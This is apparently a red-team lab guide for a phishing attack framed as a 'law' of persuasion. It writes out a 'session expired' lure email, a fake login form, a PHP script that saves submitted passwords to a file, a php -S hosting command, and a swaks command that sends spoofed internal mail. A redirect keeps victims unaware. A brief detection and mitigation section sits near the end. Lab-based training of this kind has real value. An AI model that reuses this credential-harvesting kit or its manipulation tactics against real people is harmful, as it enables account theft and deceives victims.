## **Law 9 — Win Through Actions, Never Through Argument**

Interpretation (offensive context):  
Do not try to convince the target. **Remove the need for decision-making** and drive them directly into an action path. Argument creates resistance; action bypasses it.

---

# 🎯 Attack Scenario — _Forced Workflow Execution (Auto-Action Link Trigger)_

Instead of persuading the user, you present a **pre-built action** that looks like a routine step they must complete.

**Persona:**

> _Isabella Clarke_, 20 y/o IT Operations Assistant

---

# 🔴 Red Team Objective

- Eliminate:
    
    - user questioning
        
    - back-and-forth interaction
        
- Force:
    
    - **immediate action execution (click → input → submit)**
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Remove Debate Surface

Bad approach:

> “Can you please verify your account?”

Good approach:

> “Your session expired — continue below”

👉 No room for discussion  
👉 Only one path: act

---

## Phase 2 — Action-Driven Message

### Email:

> **Subject:** Session expired
> 
> “Your session has expired. Continue below:”
> 
> [http://192.168.56.101:8080](http://192.168.56.101:8080/)

👉 No explanation  
👉 No justification  
👉 Just action

---

## Phase 3 — Payload Design (Action Continuation)

Landing page:

```html
<form action="process.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Continue Session</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 4 — Host Payload

```bash
php -S 0.0.0.0:8080
```

---

## Phase 5 — Delivery

```bash
swaks --to target@corp.local \
--from isabella.c@corp.local \
--server 192.168.56.101 \
--data "Subject: Session expired

Your session has expired. Continue below:

http://192.168.56.101:8080"
```

---

## Phase 6 — Execution

Target behavior:

- sees interruption (“session expired”)
    
- assumes legitimacy
    
- follows action flow
    
- submits credentials
    

👉 No argument → no resistance

---

# 🛠️ Tooling + Commands

### Core:

```bash
php -S 0.0.0.0:8080
```

---

### Delivery:

```bash
swaks --to target@corp.local --from isabella.c@corp.local --server 192.168.56.101
```

---

### Optional (refinement)

Auto-redirect after capture:

```php
header("Location: https://example.com/dashboard");
```

👉 Maintains illusion of normal workflow

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Compliance through workflow**
    
- **Authority framing (system message)**
    
- **Reduced cognitive friction**
    

Key principle:

> People follow processes more than they question them

---

# 🛡️ Detection & Defensive Insight

Indicators:

- generic system-style messages
    
- login prompts triggered via email
    
- lack of official domain verification
    

Mitigation:

- enforce:
    
    - session handling only within official apps
        
- user training:
    
    - “systems don’t ask credentials via email links”
        
- browser protections:
    
    - warn on suspicious redirects
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Action-Driven Workflow Manipulation

### Include:

- action-based email sample
    
- UI of fake session continuation
    
- captured credentials
    
- analysis:
    
    - why no argument occurred
        
- impact:
    
    - seamless compromise via forced action
        

---

# ⚠️ Operator Insight

Humans resist:

- persuasion
    
- arguments
    
- complex reasoning
    

Humans comply with:

- processes
    
- instructions
    
- continuation flows
    

You don’t convince the user  
You **move them**

---

